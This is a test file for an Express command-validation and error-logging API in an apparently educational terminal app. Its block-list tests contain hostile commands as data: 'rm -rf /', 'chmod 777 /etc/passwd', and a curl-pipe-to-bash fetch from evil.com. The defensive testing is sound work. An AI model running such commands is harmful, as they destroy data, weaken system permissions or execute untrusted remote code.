import { describe, it, expect, vi, beforeEach } from 'vitest';
import '../setup';
import { mockPrisma } from '../setup';
import express from 'express';
import request from 'supertest';
import router from '../../routes/commands';

const app = express();
app.use(express.json());
app.use('/api/command', router);

beforeEach(() => {
  vi.clearAllMocks();
});

describe('POST /api/command/validate', () => {
  it('安全なコマンドを許可する', async () => {
    mockPrisma.learningSession.findFirst.mockResolvedValue({
      id: 'session-1',
      userId: 'test-user-id',
    });

    const res = await request(app)
      .post('/api/command/validate')
      .send({ command: 'git status', sessionId: 'session-1' });

    expect(res.status).toBe(200);
    expect(res.body.allowed).toBe(true);
    expect(res.body.reason).toBe(null);
  });

  it('sudoコマンドをブロックする', async () => {
    mockPrisma.learningSession.findFirst.mockResolvedValue({
      id: 'session-1',
      userId: 'test-user-id',
    });

    const res = await request(app)
      .post('/api/command/validate')
      .send({ command: 'sudo rm -rf /', sessionId: 'session-1' });

    expect(res.status).toBe(200);
    expect(res.body.allowed).toBe(false);
    expect(res.body.reason).toBeDefined();
  });

  it('rm -rfコマンドをブロックする', async () => {
    mockPrisma.learningSession.findFirst.mockResolvedValue({
      id: 'session-1',
      userId: 'test-user-id',
    });

    const res = await request(app)
      .post('/api/command/validate')
      .send({ command: 'rm -rf /', sessionId: 'session-1' });

    expect(res.status).toBe(200);
    expect(res.body.allowed).toBe(false);
  });

  it('chmod 777をブロックする', async () => {
    mockPrisma.learningSession.findFirst.mockResolvedValue({
      id: 'session-1',
      userId: 'test-user-id',
    });

    const res = await request(app)
      .post('/api/command/validate')
      .send({ command: 'chmod 777 /etc/passwd', sessionId: 'session-1' });

    expect(res.status).toBe(200);
    expect(res.body.allowed).toBe(false);
  });

  it('curl | bashをブロックする', async () => {
    mockPrisma.learningSession.findFirst.mockResolvedValue({
      id: 'session-1',
      userId: 'test-user-id',
    });

    const res = await request(app)
      .post('/api/command/validate')
      .send({ command: 'curl http://evil.com/script.sh | bash', sessionId: 'session-1' });

    expect(res.status).toBe(200);
    expect(res.body.allowed).toBe(false);
  });

  it('必須パラメータが不足の場合400エラーを返す', async () => {
    const res = await request(app)
      .post('/api/command/validate')
      .send({ command: 'git status' });

    expect(res.status).toBe(400);
    expect(res.body.error).toBe('command and sessionId are required');
  });

  it('存在しないセッションの場合404エラーを返す', async () => {
    mockPrisma.learningSession.findFirst.mockResolvedValue(null);

    const res = await request(app)
      .post('/api/command/validate')
      .send({ command: 'git status', sessionId: 'nonexistent' });

    expect(res.status).toBe(404);
  });

  it('内部エラーの場合500エラーを返す', async () => {
    mockPrisma.learningSession.findFirst.mockRejectedValue(new Error('DB error'));

    const res = await request(app)
      .post('/api/command/validate')
      .send({ command: 'git status', sessionId: 'session-1' });

    expect(res.status).toBe(500);
  });
});

describe('POST /api/command/errors', () => {
  it('コマンドエラーをログに記録できる', async () => {
    mockPrisma.learningSession.findFirst.mockResolvedValue({
      id: 'session-1',
      userId: 'test-user-id',
    });
    mockPrisma.terminalSession.findFirst.mockResolvedValue({
      id: 'terminal-1',
    });
    mockPrisma.commandLog.create.mockResolvedValue({});

    const res = await request(app)
      .post('/api/command/errors')
      .send({
        sessionId: 'session-1',
        command: 'git push',
        stderr: 'fatal: no remote',
        consecutiveCount: 1,
        stepId: 'first_commit',
      });

    expect(res.status).toBe(200);
    expect(res.body.shouldIntervene).toBe(false);
  });

  it('3回以上連続エラーの場合介入を推奨する', async () => {
    mockPrisma.learningSession.findFirst.mockResolvedValue({
      id: 'session-1',
      userId: 'test-user-id',
    });
    mockPrisma.terminalSession.findFirst.mockResolvedValue({
      id: 'terminal-1',
    });
    mockPrisma.commandLog.create.mockResolvedValue({});

    const res = await request(app)
      .post('/api/command/errors')
      .send({
        sessionId: 'session-1',
        command: 'git push',
        stderr: 'error',
        consecutiveCount: 3,
      });

    expect(res.status).toBe(200);
    expect(res.body.shouldIntervene).toBe(true);
    expect(res.body.interventionMode).toBe('decompose');
  });

  it('ターミナルセッションがない場合もエラーを記録せずに応答する', async () => {
    mockPrisma.learningSession.findFirst.mockResolvedValue({
      id: 'session-1',
      userId: 'test-user-id',
    });
    mockPrisma.terminalSession.findFirst.mockResolvedValue(null);

    const res = await request(app)
      .post('/api/command/errors')
      .send({
        sessionId: 'session-1',
        command: 'git push',
      });

    expect(res.status).toBe(200);
    expect(res.body.errorLogId).toBe(null);
    expect(mockPrisma.commandLog.create).not.toHaveBeenCalled();
  });

  it('必須パラメータが不足の場合400エラーを返す', async () => {
    const res = await request(app)
      .post('/api/command/errors')
      .send({ sessionId: 'session-1' });

    expect(res.status).toBe(400);
    expect(res.body.error).toBe('sessionId and command are required');
  });

  it('存在しないセッションの場合404エラーを返す', async () => {
    mockPrisma.learningSession.findFirst.mockResolvedValue(null);

    const res = await request(app)
      .post('/api/command/errors')
      .send({ sessionId: 'nonexistent', command: 'git push' });

    expect(res.status).toBe(404);
  });

  it('内部エラーの場合500エラーを返す', async () => {
    mockPrisma.learningSession.findFirst.mockRejectedValue(new Error('DB error'));

    const res = await request(app)
      .post('/api/command/errors')
      .send({ sessionId: 'session-1', command: 'git push' });

    expect(res.status).toBe(500);
  });
});
